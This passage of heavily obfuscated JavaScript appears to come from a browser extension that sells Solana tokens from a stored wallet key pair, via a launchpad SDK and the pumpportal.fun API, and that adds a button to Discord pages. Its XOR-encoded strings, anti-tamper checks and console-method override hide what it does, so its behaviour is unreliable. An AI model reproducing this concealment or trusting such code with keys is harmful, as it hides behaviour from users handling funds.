              S = 390,
              _ = 389,
              T = 414,
              B = 446,
              C = 444,
              E = 413,
              x = 413,
              P = NP,
              O = {
                UQVMh: function (t, e) {
                  return t >>> e;
                },
                JOwkq: function (t, e) {
                  return t % e;
                },
                ZXnun: function (t, e) {
                  return t < e;
                },
                FOfGH: function (t, e) {
                  return t & e;
                },
                svJUy: function (t, e) {
                  return t ^ e;
                },
                VjoRp: function (t, e) {
                  return t * e;
                },
                szyvq: function (t, e) {
                  return t & e;
                },
                EBnOE: function (t, e, n, r) {
                  return t(e, n, r);
                },
                dagSf: function (t, e, n, r) {
                  return t(e, n, r);
                },
                OHfKe: function (t, e) {
                  return t(e);
                },
                veCki: "undefined",
                soYDS: function (t, e) {
                  return t !== e;
                },
                Cgdlq: function (t, e) {
                  return t instanceof e;
                },
                AQPZU: "string",
                JYWIn: "object",
              };
            try {
              const k = Yg.getInstance();
              if (!k[P(n) + P(r)]())
                return {
                  msg: (function () {
                    let t;
                    return function () {
                      if (!t) {
                        const e = new Uint8Array([
                            148, 52, 165, 117, 225, 41, 175, 115, 225, 38, 181,
                            115, 169, 34, 174, 115, 168, 36, 161, 115, 164, 35,
                          ]),
                          n = 130041793,
                          r = new Uint8Array(e.length);
                        for (let t = 0; t < e.length; t++) {
                          const o = (n >>> ((t % 4) * 8)) & 255;
                          r[t] = e[t] ^ o;
                        }
                        t = new TextDecoder().decode(r);
                      }
                      return t;
                    };
                  })()(),
                  success: ![],
                };
              const I = $g.getInstance(),
                S = I.getWallet();
              if (!S)
                return {
                  msg: (function () {
                    const t = 380;
                    let e;
                    return function () {
                      const n = WP;
                      if (!e) {
                        const r = new Uint8Array([
                            141, 40, 224, 112, 162, 43, 172, 98, 183, 103, 164,
                            98, 183, 34, 163, 115, 166, 35,
                          ]),
                          o = 130041795,
                          i = new Uint8Array(r[n(380)]);
                        for (let e = 0; e < r[n(t)]; e++) {
                          const t = 255 & O.UQVMh(o, 8 * O.JOwkq(e, 4));
                          i[e] = r[e] ^ t;
                        }
                        e = new TextDecoder().decode(i);
                      }
                      return e;
                    };
                  })()(),
                  success: ![],
                };
              if (!VP && ((VP = await LP(S, k[P(o) + "ion"]())), !VP))
                return {
                  msg: (function () {
                    const t = 384,
                      e = 413,
                      n = {
                        gQRBc: function (t, e) {
                          return t & e;
                        },
                        exdye: function (t, e) {
                          return O.JOwkq(t, e);
                        },
                      };
                    let r;
                    return function () {
                      const o = WP;
                      if (!r) {
                        const i = new Uint8Array([
                            135, 38, 169, 107, 164, 35, 224, 115, 174, 103, 169,
                            105, 168, 51, 169, 102, 173, 46, 186, 98, 225, 21,
                            161, 126, 165, 46, 181, 106, 224,
                          ]),
                          s = 130041793,
                          a = new Uint8Array(i.length);
                        for (let e = 0; e < i.length; e++) {
                          const r = n.gQRBc(s >>> (8 * n[o(t)](e, 4)), 255);
                          a[e] = i[e] ^ r;
                        }
                        r = new TextDecoder()[o(e)](a);
                      }
                      return r;
                    };
                  })()(),
                  success: ![],
                };
              let _ = I.getKeyPair();
              if (!I[P(431)]() || !_)
                return {
                  msg: (function () {
                    const t = 380,
                      e = 413,
                      n = function (t, e) {
                        return O.UQVMh(t, e);
                      },
                      r = function (t, e) {
                        return t % e;
                      },
                      o = function (t, e) {
                        return t ^ e;
                      };
                    let i;
                    return function () {
                      const s = WP;
                      if (!i) {
                        const a = new Uint8Array([
                            132, 40, 181, 107, 163, 103, 174, 104, 179, 103,
                            166, 110, 169, 35, 224, 115, 168, 44, 165, 105, 233,
                            105, 255,
                          ]),
                          u = 130041799,
                          c = new Uint8Array(a[s(t)]);
                        for (let t = 0; t < a.length; t++) {
                          const e = 255 & n(u, 8 * r(t, 4));
                          c[t] = o(a[t], e);
                        }
                        i = new TextDecoder()[s(e)](c);
                      }
                      return i;
                    };
                  })()(),
                  success: ![],
                };
              const T = _.publicKey,
                B = await O.EBnOE(pl, T, S[P(i)], !![]),
                R = await VP[P(s)][P(a) + P(u) + "ce"](B, "processed");
              if (!R || !R.value)
                return {
                  msg: (function () {
                    let t;
                    return function () {
                      const e = WP;
                      if (!t) {
                        const n = new Uint8Array([
                            149, 40, 171, 98, 175, 103, 161, 100, 162, 40, 181,
                            105, 181, 103, 174, 104, 181, 103, 166, 104, 180,
                            41, 164,
                          ]),
                          r = 130041793,
                          o = new Uint8Array(n.length);
                        for (let t = 0; O.ZXnun(t, n[e(380)]); t++) {
                          const e = O.FOfGH(r >>> ((t % 4) * 8), 255);
                          o[t] = O.svJUy(n[t], e);
                        }
                        t = new TextDecoder()[e(x)](o);
                      }
                      return t;
                    };
                  })()(),
                  success: ![],
                };
              const M = new Yn(R.value[P(c)]),
                L = new Yn(t),
                N = M.mul(L).div(new Yn(100));
              if (N.isZero())
                return {
                  msg: (function () {
                    let t;
                    return function () {
                      const e = WP;
                      if (!t) {
                        const n = new Uint8Array([
                            144, 34, 172, 107, 227, 38, 173, 104, 182, 41, 180,
                            39, 170, 52, 224, 125, 166, 53, 175,
                          ]),
                          r = 130041795,
                          o = new Uint8Array(n.length);
                        for (let t = 0; t < n.length; t++) {
                          const i = O.FOfGH(O.UQVMh(r, O[e(C)](t % 4, 8)), 255);
                          o[t] = n[t] ^ i;
                        }
                        t = new TextDecoder()[e(E)](o);
                      }
                      return t;
                    };
                  })()(),
                  success: ![],
                };
              const D = Qg.getInstance().getSettings();
              D &&
                ((FP[P(l) + "eUnits"] = tR(D.priorityFee)),
                (FP.slippage = D.slippage));
              const U = O.dagSf($x, jP, T, xc).publicKey,
                q = {};
              q[P(d)] = U;
              const z = await VP[P(f)][P(h) + "Info"](q),
                K = await VP.connection[P(p) + P(m)](z.platformId);
              if (!K)
                return {
                  msg: (function () {
                    const t = 404,
                      e = 413,
                      n = 377,
                      r = {
                        TdqHQ: function (t, e) {
                          return O[WP(n)](t, e);
                        },
                        hczeg: function (t, e) {
                          return t % e;
                        },
                      };
                    let o;
                    return function () {
                      const n = WP;
                      if (!o) {
                        const i = new Uint8Array([
                            145, 43, 161, 115, 167, 40, 178, 106, 225, 38, 163,
                            100, 174, 50, 174, 115, 225, 41, 175, 115, 225, 33,
                            175, 114, 175, 35,
                          ]),
                          s = 130041793,
                          a = new Uint8Array(i[n(380)]);
                        for (let e = 0; e < i.length; e++) {
                          const o = r.TdqHQ(s >>> (8 * r[n(t)](e, 4)), 255);
                          a[e] = i[e] ^ o;
                        }
                        o = new TextDecoder()[n(e)](a);
                      }
                      return o;
                    };
                  })()(),
                  success: ![],
                };
              const W = yP[P(g)](K.data),
                { execute: F } = await VP.launchpad[P(y)]({
                  slippage: new Yn(100 * FP[P(w)]),
                  programId: jP,
                  mintA: T,
                  configInfo: z.configInfo,
                  platformFeeRate: W.feeRate,
                  txVersion: fS.V0,
                  sellAmount: N,
                  feePayer: S.publicKey,
                }),
                j = { sendAndConfirm: !![] };
              j[P(b) + "ght"] = !![];
              const G = await O[P(397)](F, j),
                V = G && G.txId !== O.veCki && O.soYDS(G.txId, void 0);
              await (null == (e = Lg[P(v) + "nt"]())
                ? void 0
                : e[P(387)](S.publicKey));
              const H = {};
              return (
                (H.msg = V
                  ? P(A) + "ly sold " + t + "% of tokens"
                  : "Selling failed"),
                (H.success = V),
                H
              );
            } catch (R) {
              let t = P(k) + P(I);
              O.Cgdlq(R, Error)
                ? (t = R[P(S)])
                : typeof R === O.AQPZU
                ? (t = R)
                : R && typeof R === O[P(_)] && (t = JSON[P(T)](R));
              const e = {};
              return (e.msg = "" + t), (e[P(B)] = ![]), e;
            }
          })(t);
          xg(e, n ? s(494) : "error");
        }
        return;
      } catch (u) {
        let t = a[s(r)];
        u instanceof Error
          ? (t = u[s(o)])
          : typeof u === s(i)
          ? (t = u)
          : u && a.Kiohe(typeof u, a.WHNBi) && (t = JSON.stringify(u)),
          xg("Sell error: " + t, a.GAwdU);
      }
    },
    nR = async (t) => {
      const e = 588,
        n = 589,
        r = zO,
        o = {};
      (o[r(517)] = r(e) + r(601)),
        (o[r(n)] = function (t, e) {
          return t === e;
        });
      const i = o;
      try {
        await (async (t) => {
          const e = 312,
            n = 320,
            r = 269,
            o = 284,
            i = 274,
            s = 262,
            a = 263,
            u = 253,
            c = 275,
            l = 317,
            d = 325,
            f = 266,
            h = 268,
            p = 282,
            m = 294,
            g = 302,
            y = 275,
            w = 304,
            b = 304,
            v = 297,
            A = 323,
            k = 271,
            I = NO,
            S = {
              eLQCf: function (t, e) {
                return t & e;
              },
              RLaMr: function (t, e) {
                return t ^ e;
              },
              MwtGH: function (t, e, n) {
                return t(e, n);
              },
              ZzYty: I(251) + I(e),
              OrKRS: function (t, e) {
                return t !== e;
              },
              EVTsa: "Failed to " + I(309) + "s",
              GJkfo: "error",
              mwJsm: "Unknown er" + I(n),
              rBTlh: function (t, e) {
                return t + e;
              },
            };
          try {
            if (!Yg.getInstance().isUserAuthenticated())
              return (
                S.MwtGH(
                  xg,
                  (function () {
                    let t;
                    return function () {
                      const e = NO;
                      if (!t) {
                        const n = new Uint8Array([
                            140, 215, 203, 205, 249, 205, 221, 159, 183, 203,
                            218, 159, 184, 209, 218, 215, 188, 202, 218, 214,
                            186, 197, 218, 218, 189,
                          ]),
                          r = -1079073575,
                          o = new Uint8Array(n[e(w)]);
                        for (let t = 0; t < n[e(b)]; t++) {
                          const i = S[e(v)](r >>> ((t % 4) * 8), 255);
                          o[t] = S[e(A)](n[t], i);
                        }
                        t = new TextDecoder()[e(k)](o);
                      }
                      return t;
                    };
                  })()(),
                  "error"
                ),
                void 0
              );
            const e = Qg.getInstance().getSettings(),
              n = $g[I(r) + "e"]();
            let p = n[I(o)]();
            if (!n.hasKeyPair() || !p)
              return (
                S[I(i)](
                  xg,
                  (function () {
                    const t = 271,
                      e = 323,
                      n = function (t, e) {
                        return t * e;
                      },
                      r = function (t, n) {
                        return S[NO(e)](t, n);
                      };
                    let o;
                    return function () {
                      const e = NO;
                      if (!o) {
                        const i = new Uint8Array([
                            152, 203, 219, 211, 191, 132, 192, 208, 175, 132,
                            200, 214, 181, 192, 142, 203, 180, 207, 203, 209,
                            245, 138, 145,
                          ]),
                          s = -1079073573,
                          a = new Uint8Array(i.length);
                        for (let t = 0; t < i[e(304)]; t++) {
                          const e = (s >>> n(t % 4, 8)) & 255;
                          a[t] = r(i[t], e);
                        }
                        o = new TextDecoder()[e(t)](a);
                      }
                      return o;
                    };
                  })()(),
                  I(s)
                ),
                void 0
              );
            const m = {};
            m[I(a) + "pe"] = S[I(330)];
            const g = await fetch(
                "https://pumpportal.fun/api/tra" +
                  I(u) +
                  "=" +
                  (null == e ? void 0 : e.apiKey),
                {
                  method: "POST",
                  headers: m,
                  body: JSON[I(c)]({
                    action: I(l),
                    mint: p.publicKey[I(257)](),
                    amount: t + "%",
                    denominatedInSol: "false",
                    slippage: (null == e ? void 0 : e.slippage) || 10,
                    priorityFee: (null == e ? void 0 : e.priorityFee) || 5e-4,
                    pool: null == e ? void 0 : e.rpcMode,
                  }),
                }
              ),
              y = await g.json();
            if (
              y[I(325)] &&
              S.OrKRS(y[I(d)], "undefined") &&
              void 0 !== y[I(d)]
            )
              return xg(I(f) + t + (I(h) + "s"), "success"), void 0;
            S.MwtGH(xg, S.EVTsa, S[I(290)]);
          } catch (_) {
            let t = S[I(p)];
            _ instanceof Error
              ? (t = _[I(m)])
              : typeof _ === I(g)
              ? (t = _)
              : _ && typeof _ === I(254) && (t = JSON[I(y)](_)),
              xg(S.rBTlh("Sell error: ", t), "error");
          }
        })(t);
      } catch (s) {
        i[r(517)],
          s instanceof Error
            ? s.message
            : "string" == typeof s ||
              (s && i.weYBK(typeof s, "object") && JSON.stringify(s));
      }
    };
  function rR(t, e) {
    const n = QO();
    return (
      (rR = function (e, r) {
        let o = n[(e -= 485)];
        if (void 0 === rR.UMKTeR) {
          var i = function (t) {
            let e = "",
              n = "",
              r = e + i;
            for (
              let o, i, s = 0, a = 0;
              (i = t.charAt(a++));
              ~i && ((o = s % 4 ? 64 * o + i : i), s++ % 4)
                ? (e +=
                    r.charCodeAt(a + 10) - 10 != 0
                      ? String.fromCharCode(255 & (o >> ((-2 * s) & 6)))
                      : s)
                : 0
            )
              i =
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(
                  i
                );
            for (let o = 0, i = e.length; o < i; o++)
              n += "%" + ("00" + e.charCodeAt(o).toString(16)).slice(-2);
            return decodeURIComponent(n);
          };
          (rR.LKzDYu = i), (t = arguments), (rR.UMKTeR = !![]);
        }
        const s = e + n[0],
          a = t[s];
        if (a) o = a;
        else {
          const e = function (t) {
            (this.enSuat = t),
              (this.OrxmTP = [1, 0, 0]),
              (this.fUoqwc = function () {
                return "newState";
              }),
              (this.VrMepg = "\\w+ *\\(\\) *{\\w+ *"),
              (this.DVxabA = "['|\"].+['|\"];? *}");
          };
          (e.prototype.bjcCLu = function () {
            const t = new RegExp(this.VrMepg + this.DVxabA).test(
              this.fUoqwc.toString()
            )
              ? --this.OrxmTP[1]
              : --this.OrxmTP[0];
            return this.FjYNpN(t);
          }),
            (e.prototype.FjYNpN = function (t) {
              return Boolean(~t) ? this.MhghKw(this.enSuat) : t;
            }),
            (e.prototype.MhghKw = function (t) {
              for (let e = 0, n = this.OrxmTP.length; e < n; e++)
                this.OrxmTP.push(Math.round(Math.random())),
                  (n = this.OrxmTP.length);
              return t(this.OrxmTP[0]);
            }),
            new e(rR).bjcCLu(),
            (o = rR.LKzDYu(o)),
            (t[s] = o);
        }
        return o;
      }),
      rR(t, e)
    );
  }
  axiomVamp;
  const oR = iR;
  function iR(t, e) {
    const n = uR();
    return (
      (iR = function (e, r) {
        let o = n[(e -= 379)];
        if (void 0 === iR.DdULaG) {
          var i = function (t) {
            let e = "",
              n = "",
              r = e + i;
            for (
              let o, i, s = 0, a = 0;
              (i = t.charAt(a++));
              ~i && ((o = s % 4 ? 64 * o + i : i), s++ % 4)
                ? (e +=
                    r.charCodeAt(a + 10) - 10 != 0
                      ? String.fromCharCode(255 & (o >> ((-2 * s) & 6)))
                      : s)
                : 0
            )
              i =
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(
                  i
                );
            for (let o = 0, i = e.length; o < i; o++)
              n += "%" + ("00" + e.charCodeAt(o).toString(16)).slice(-2);
            return decodeURIComponent(n);
          };
          (iR.aQfoRa = i), (t = arguments), (iR.DdULaG = !![]);
        }
        const s = e + n[0],
          a = t[s];
        if (a) o = a;
        else {
          const e = function (t) {
            (this.MBUQfN = t),
              (this.avacfa = [1, 0, 0]),
              (this.xZvhCj = function () {
                return "newState";
              }),
              (this.teVgpc = "\\w+ *\\(\\) *{\\w+ *"),
              (this.nhPOxR = "['|\"].+['|\"];? *}");
          };
          (e.prototype.teFtPo = function () {
            const t = new RegExp(this.teVgpc + this.nhPOxR).test(
              this.xZvhCj.toString()
            )
              ? --this.avacfa[1]
              : --this.avacfa[0];
            return this.ucZaMH(t);
          }),
            (e.prototype.ucZaMH = function (t) {
              return Boolean(~t) ? this.DloRNH(this.MBUQfN) : t;
            }),
            (e.prototype.DloRNH = function (t) {
              for (let e = 0, n = this.avacfa.length; e < n; e++)
                this.avacfa.push(Math.round(Math.random())),
                  (n = this.avacfa.length);
              return t(this.avacfa[0]);
            }),
            new e(iR).teFtPo(),
            (o = iR.aQfoRa(o)),
            (t[s] = o);
        }
        return o;
      }),
      iR(t, e)
    );
  }
  !(function (t) {
    const e = 390,
      n = 496,
      r = 391,
      o = 447,
      i = 403,
      s = 398,
      a = 416,
      u = 503,
      c = 411,
      l = 513,
      d = 512,
      f = iR,
      h = t();
    for (; []; )
      try {
        if (
          511989 ===
          parseInt(f(e)) / 1 +
            -parseInt(f(n)) / 2 +
            (parseInt(f(r)) / 3) * (parseInt(f(o)) / 4) +
            (-parseInt(f(i)) / 5) * (-parseInt(f(s)) / 6) +
            (-parseInt(f(a)) / 7) * (-parseInt(f(u)) / 8) +
            (parseInt(f(c)) / 9) * (parseInt(f(l)) / 10) +
            -parseInt(f(d)) / 11
        )
          break;
        h.push(h.shift());
      } catch (p) {
        h.push(h.shift());
      }
  })(uR);
  const sR = (function () {
      let t = !![];
      return function (e, n) {
        const r = t
          ? function () {
              if (n) {
                const t = n.apply(e, arguments);
                return (n = null), t;
              }
            }
          : function () {};
        return (t = ![]), r;
      };
    })(),
    aR = sR(void 0, function () {
      const t = 389,
        e = 461,
        n = iR,
        r = { BwVbh: "(((.+)+)+)+$" },
        o = r;
      return aR
        .toString()
        .search(n(560) + "+$")
        [n(t)]()
        .constructor(aR)
        [n(e)](o.BwVbh);
    });
  function uR() {
    const t = [
      "zg9JDw1LBNrFAq",
      "u1rgDgu",
      "A2DNzw0",
      "B3jFxZyYm2rLla",
      "Dg9YqwXS",
      "iaOGicaGicaGia",
      "mtm1mK1Ryvjhrq",
      "y29TBw9Uqw5Jzq",
      "zM9YBtOGDhjHBG",
      "z2v0v2fSBgv0",
      "u0Xguuu",
      "uNjfzKu",
      "ihrLEhqTC2HHza",
      "iZu1ntSkicaGia",
      "y2XHC3noyw1L",
      "yMLUza",
      "igjVEc1ZAgfKBW",
      "iL0SigfBAhjLzG",
      "BM9Uzq",
      "Dg9mB3DLCKnHCW",
      "C2vHCMnO",
      "x19WCM90B19F",
      "Evbbzem",
      "D2fYBG",
      "C3bSAxq",
      "EI1PBMrLEdOGmG",
      "icaGzgLZCgXHEq",
      "icaGicaGyM9Yza",
      "icaGicaGmcuGEW",
      "z2v0uMfUz2vbDa",
      "ys5LBwjLzfrPDa",
      "z2v0sw5ZDgfUyW",
      "BwfW",
      "yMfJA2DYB3vUza",
      "m2eGmcuSicm0yq",
      "zNjVBq",
      "CMvHDguTy29PBG",
      "EdSkicaGicaGia",
      "icaGicaGicb0CG",
      "ih0kicaGicaGia",
      "ysGWldaSmcWWlG",
      "FqOGicaGicaGia",
      "icaGicaGcIaGia",
      "DdOGm3b4oWOGia",
      "ign1CNnVCJOGCa",
      "zgv4oIaTmtSkia",
      "icaGicaGih0kia",
      "oIbUB25LoWOGia",
      "C3jJ",
      "oWOGicaGicaGia",
      "zxjYB3i",
      "yM9KEq",
      "rK1szhe",
      "igLUC2v0idaGmq",
      "nNb4ihjNyMeOma",
      "mtq1nJuZohfhEKzHyG",
      "CwjmswG",
      "icaGicaGEI1PBG",
      "y29UDgfPBMvYsq",
      "cIaGicaGicaGia",
      "mcaXChGGmcbYzW",
      "icaGicaGicaGia",
      "mJCZnJG0ohvIrhHLzW",
      "tKDOz1m",
      "Aw5KzxG6idK5oq",
      "w2nSyxnZxJ0NBq",
      "ztSkicaGicaGia",
      "mxb4ihnVBgLKia",
      "zw50",
      "AunRshG",
      "DhjHy2u",
      "nZu4nti4mxHODe5uBa",
      "mtbPEgfqwK0",
      "AgfZ",
      "y2TNCM91BMq6ia",
      "ugLYs2O",
      "BwvZC2fNzq",
      "zxnZywDLq29UDa",
      "Ahr0Chm6lY94lG",
      "mcuPoWOGicaGia",
      "CMfUC2XHDgvyka",
      "rhfHCLi",
      "mJu1ldi1nsWYnq",
      "yMeOodCSide0mW",
      "q3jLyxrLignVAq",
      "lMvTyMvKqxv0Aa",
      "igjHy2TKCM9Wlq",
      "y2HHBM5LBhmVkG",
      "EYbIywnRz3jVDq",
      "icbIywnRz3jVDq",
      "ExbrAKi",
      "ChvZAa",
      "C3rVCKnVBNrHAq",
      "BgvFxZyYm2rL",
      "Aw9U",
      "C29SDxrLoWOGia",
      "C3rYAw5NAwz5",
      "BgvUz3rO",
      "jsKGDhjHBNnSyq",
      "BI1IDg4",
      "yM9YzgvYoIbUBW",
      "yxbWzw5Kq2HPBa",
      "z2v0u2vSzwn0Aq",
      "EeHos0e",
      "yxvSDa",
      "ywnRz3jVDw5KoG",
      "rgvWBg95",
      "cIaGicaGicaGlG",
      "BNrLBNq6icCNoW",
      "icaGigXLDhrLCG",
      "icaGzM9UDc1ZAq",
      "C2nYB2XSwq",
      "y2XPy2S",
      "DxiOmtbWEcK7cG",
      "nsWWlJe1ktSkia",
      "lMzSB2f0Aw5Nlq",
      "icaGicaGignVBa",
      "DhjPBq",
      "ChGGmcbYz2jHka",
      "kcGOlISPkYKRkq",
      "icaGicb0B3a6ia",
      "yw5ZzM9YBtOGDa",
      "Dw5KoIbSAw5Lyq",
      "y29T",
      "AgfUz2u",
      "idHWEdSkicaGia",
      "re9nq29UDgvUDa",
      "mc4ZChG7cIaGia",
      "C3rLBMvY",
      "DdOGnJaWoWOGia",
      "ys5VCMLNAw5HBa",
      "CgfKzgLUzZOGmq",
      "BgvMDa",
      "zgL2lMDYAwrdBW",
      "B246igDYywrPzq",
      "Dg9W",
      "CxvLCNLtzwXLyW",
      "ldaSmcWWlJmPla",
      "y3jLyxrLlwnVAq",
      "u05sEu8",
      "C3rYAw5N",
      "Bg9N",
      "Dg9tDhjPBMC",
      "mJKZmJqZqLLysgDo",
      "ndm3mwrSwuPMvq",
      "zwn0CW",
      "lxjHzgL1CZOGnG",
      "C3vIDhjLzq",
      "ldaSmcWWlJyPoW",
      "nJy2oWOGicaGia",
      "y2nJy0K",
      "odqWnZaYrvPlAuHu",
      "idaUmNmGzwfZzq",
      "BI1IDg46oMjLzG",
      "ChjVDg90ExbL",
      "D2L0DgvYlMnVBq",
      "nufLsgTOzW",
      "icaGyw5PBwf0Aq",
      "wK5JD2K",
      "mty4lcaXotiSia",
      "wujprhO",
      "zgf0yxnLDa",
      "C3r5Bgu",
      "kJ0IEc5JB20Ixq",
      "ntK1nZa3m3LmALnZva",
      "zwCSCMDIysG2mW",
      "zMLUAxrLoWOGia",
      "igzVBNqTD2vPzW",
      "ywrKrxzLBNrmAq",
      "n1zxs05ODW",
      "icaGCg9ZAxrPBW",
      "kdeZnwrLzYWGiW",
      "BMn0Aw9UkcKG",
      "t3fzzhK",
      "AhjLzG",
      "ChG7cIaGicaGia",
      "BgLUzwfYlwDYyq",
      "DgfIBgu",
      "E30Uy29UC3rYDq",
      "z2v0q2XPzw50uG",
      "icaGicaGigjHyW",
      "ywXHBMnL",
      "DxrOB3jFxZyYmW",
      "AgfZvg9Rzw4",
      "zgLZCgXHEq",
      "yNv0Dg9U",
      "Dg9Y",
      "C1POzhq",
      "AwvUDc1IB3jKzq",
      "lMDYAwrFxZyYmW",
      "BJOGmcuGntaLoW",
      "mhb4ihjNyMeOma",
      "ihjLBgf0AxzLoW",
      "icaGCgfKzgLUzW",
    ];
    return (uR = function () {
      return t;
    })();
  }
  aR();
  const cR = (function () {
      let t = !![];
      return function (e, n) {
        const r = t
          ? function () {
              if (n) {
                const t = n.apply(e, arguments);
                return (n = null), t;
              }
            }
          : function () {};
        return (t = ![]), r;
      };
    })(),
    lR = cR(void 0, function () {
      const t = 388,
        e = 420,
        n = 386,
        r = 442,
        o = 420,
        i = 491,
        s = 386,
        a = 511,
        u = 538,
        c = 401,
        l = 456,
        d = 462,
        f = 419,
        h = 425,
        p = iR,
        m = {};
      (m.STFte = p(t)),
        (m[p(e)] = p(464)),
        (m.ZNcwi = "info"),
        (m[p(n)] = "exception");
      const g = m,
        y = (function () {
          const t = p;
          let e;
          try {
            e = Function(
              "return (fu" + t(f) + t(h) + 'ctor("return this")( ));'
            )();
          } catch (n) {
            e = window;
          }
          return e;
        })(),
        w = (y.console = y.console || {}),
        b = [g[p(r)], g[p(o)], g[p(405)], p(i), g[p(s)], p(424), p(a)];
      for (let v = 0; v < b[p(u)]; v++) {
        const t = cR.constructor[p(c)][p(l)](cR),
          e = b[v],
          n = w[e] || t;
        (t[p(d)] = cR[p(456)](cR)),
          (t.toString = n.toString.bind(n)),
          (w[e] = t);
      }
    });
  lR(),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  ({
    matches: ["https://discord.com/" + oR(528)],
    runAt: oR(441) + "dle",
    main() {
      const t = 547,
        e = 459,
        n = 385,
        r = 540,
        o = 525,
        i = 436,
        s = 553,
        a = 526,
        u = 444,
        c = 534,
        l = 571,
        d = 519,
        f = 564,
        h = 471,
        p = 534,
        m = 492,
        g = 542,
        y = 415,
        w = 569,
        b = 415,
        v = 569,
        A = 433,
        k = 472,
        I = 450,
        S = 428,
        _ = 535,
        T = 517,
        B = 429,
        C = 410,
        E = 473,
        P = 489,
        O = 476,
        R = 476,
        M = 514,
        L = 443,
        N = 460,
        D = 514,
        U = 522,
        q = 452,
        z = 532,
        K = 544,
        W = 537,
        F = 389,
        j = 421,
        G = 397,
        V = 538,
        H = 383,
        Z = 497,
        X = 383,
        J = 415,
        Y = 531,
        Q = 433,
        $ = 504,
        tt = 545,
        et = 383,
        nt = 445,
        rt = 569,
        ot = 567,
        it = 548,
        st = 385,
        at = 502,
        ut = 502,
        ct = 572,
        lt = 414,
        dt = 485,
        ft = 541,
        ht = 468,
        pt = 423,
        mt = 524,
        gt = 406,
        yt = 520,
        wt = 557,
        bt = 399,
        vt = 490,
        At = 550,
        kt = 568,
        It = 439,
        St = 500,
        _t = 404,
        Tt = 381,
        Bt = 413,
        Ct = 466,
        Et = 548,
        xt = 417,
        Pt = 507,
        Ot = 561,
        Rt = 484,
        Mt = 502,
        Lt = 546,
        Nt = 475,
        Dt = 393,
        Ut = 422,
        qt = 498,
        zt = 486,
        Kt = 457,
        Wt = 384,
        Ft = 494,
        jt = 559,
        Gt = 483,
        Vt = 469,
        Ht = 482,
        Zt = 474,
        Xt = 480,
        Jt = 529,
        Yt = 437,
        Qt = 480,
        $t = 536,
        te = 505,
        ee = 440,
        ne = 563,
        re = 418,
        oe = 508,
        ie = 454,
        se = 488,
        ae = 478,
        ue = 551,
        ce = 502,
        le = 570,
        de = 479,
        fe = 562,
        he = 481,
        pe = 501,
        me = 527,
        ge = 554,
        ye = 530,
        we = 520,
        be = 396,
        ve = 539,
        Ae = 495,
        ke = 555,
        Ie = 487,
        Se = 542,
        _e = 455,
        Te = 558,
        Be = 408,
        Ce = 445,
        Ee = 451,
        xe = 499,
        Pe = 409,
        Oe = 431,
        Re = 558,
        Me = 465,
        Le = 543,
        Ne = 389,
        De = 409,
        Ue = 407,
        qe = 426,
        ze = 392,
        Ke = 434,
        We = 538,
        Fe = 552,
        je = 382,
        Ge = 408,
        Ve = 470,
        He = 448,
        Ze = 533,
        Xe = 506,
        Je = 509,
        Ye = 510,
        Qe = oR,
        $e = {
          fndpq: Qe(432),
          UFDsn: "floating-c" + Qe(477) + "-btn",
          iCkHx: Qe(t),
          sZhdt: function (t, e) {
            return t === e;
          },
          YBODz: function (t) {
            return t();
          },
          HxxbO: Qe(e),
          hXDPj: function (t, e) {
            return t + e;
          },
          SLFQE: "div.grid__623de",
          PirKj: Qe(n) + Qe(r),
          yPAdC: Qe(o) + "n",
          yZqwG: "div.gridContainer__623de > div" + Qe(i) + "de",
          qbLIh: ".create-coin-btn",
          ypQjB: Qe(s),
          NGhgS: Qe(a) + Qe(u) + " .embedTit" + Qe(c),
          gEwUa: Qe(l) + "Link_af017a",
          SKHne: function (t, e) {
            return t === e;
          },
          kggem: ".twimg.",
          DqarR: "https://twitter.com",
          RrEfE: Qe(d) + Qe(f),
          xHNKA: "Unknown error",
          yUuho: function (t, e) {
            return t || e;
          },
          ccccI: function (t, e) {
            return t > e;
          },
          ZIeVs: Qe(h) + Qe(p),
          CfFKw: function (t, e) {
            return t(e);
          },
          eUycx: function (t, e) {
            return t(e);
          },
          EOBGH: function (t, e) {
            return t(e);
          },
          FMRdq: function (t, e) {
            return t instanceof e;
          },
          WpVzZ: "string",
          dlqgv: function (t) {
            return t();
          },
          tvhFN: "mouseup",
        };
      CR("light");
      const tn = $e.dlqgv(() => {
        const t = Qe,
          e = document["createElem" + t(Je)]($e.fndpq);
        return (e.className = $e.UFDsn), (e.textContent = $e[t(Ye)]), e;
      });
      document[Qe(m)][Qe(g) + "d"](tn);
      let en = ![];
      document[Qe(y) + Qe(w)]("mousedown", () => (en = !![])),
        document.addEventListener($e.tvhFN, () => (en = ![]));
      const nn = () => {
          const t = Qe,
            e = window.getSelection();
          if (!e || 0 === e.rangeCount) return null;
          let n = e[t(Ve)](0)[t(He) + t(Ze) + "ner"];
          for (; n && n.nodeType === Node.TEXT_NODE; ) n = n.parentNode;
          if (!n) return null;
          const r = n.closest("div.grid__623de");
          return r || n.closest(t(Xe) + t(518) + "ent']");
        },
        rn = () => {
          const t = Qe;
          if (en) return;
          const e = window[t(Le) + "on"]();
          if (!e || $e.sZhdt(e[t(Ne)]().trim(), ""))
            return (tn[t(De)].display = "none"), void 0;
          const n = $e[t(Ue)](nn);
          if (!n) return (tn[t(409)].display = $e.HxxbO), void 0;
          const r = e.getRangeAt(0)[t(qe) + t(ze)]();
          if ($e[t(Ke)](r[t(We)], 0)) return;
          const o = r[r[t(We)] - 1];
          (tn.style.display = "block"),
            (tn.style[t(382)] = window[t(Fe)] + o[t(je)] - 35 + "px"),
            (tn[t(De)].left =
              $e.hXDPj(window.scrollX + o[t(379)], o.width / 2) + "px");
          const i = document[t(383) + "torAll"]("div.grid__623de");
          tn[t(Ge)].containerId = Array.from(i).indexOf(n)[t(Ne)]();
        };
      document[Qe(b) + Qe(v)]("mouseup", rn),
        document.addEventListener("selectionc" + Qe(565), rn),
        tn.addEventListener("click", () => {
          const t = Qe,
            e = window.getSelection();
          if (!e) return;
          const n = e.toString()[t(Te)]();
          if (!n) return;
          let r = null;
          if (tn[t(Be)].containerId) {
            const e = document["querySelec" + t(Ce)]($e[t(Ee)]),
              n = parseInt(tn.dataset[t(xe) + "d"]);
            n >= 0 && n < e.length && (r = e[n]);
          }
          if (!r) return;
          const o = n,
            i = ((t) => {
              const e = Qe,
                n = t[e(Re)]()[e(Me)](/\s+/);
